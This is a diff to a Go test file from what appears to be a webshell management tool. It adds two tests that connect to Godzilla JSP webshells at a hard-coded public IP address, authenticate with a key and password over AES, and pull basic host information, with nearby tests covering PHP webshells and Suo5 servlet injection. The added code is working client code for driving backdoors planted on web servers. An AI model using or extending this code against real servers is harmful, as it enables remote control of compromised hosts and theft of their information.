@@ -201,6 +201,50 @@ func TestNewWebPHPShell_B3(t *testing.T) {
 	t.Logf("%v", string(cmd))
 }
 
+func TestNewGodzillaBase64Jsp(t *testing.T) {
+	url := "http://47.120.44.219:8080/bs64.jsp"
+
+	gs, err := NewGodzillaManager(
+		url,
+		SetSecretKey("key"),
+		SetPass("pass"),
+		SetShellScript("jsp"),
+		SetBase64Aes(),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	info, err := gs.BasicInfo()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(string(info))
+}
+
+func TestNewGodzillaRawJsp(t *testing.T) {
+	url := "http://47.120.44.219:8080/raw.jsp"
+
+	gs, err := NewGodzillaManager(
+		url,
+		SetSecretKey("key"),
+		SetPass("pass"),
+		SetShellScript("jsp"),
+		SetRawAes(),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	info, err := gs.BasicInfo()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(string(info))
+}
+
 func TestInjectSuo5Servlet(t *testing.T) {
 	url := "http://127.0.0.1:8080/bs64.jsp"
 	godzillaShell, _ := NewWebShell(
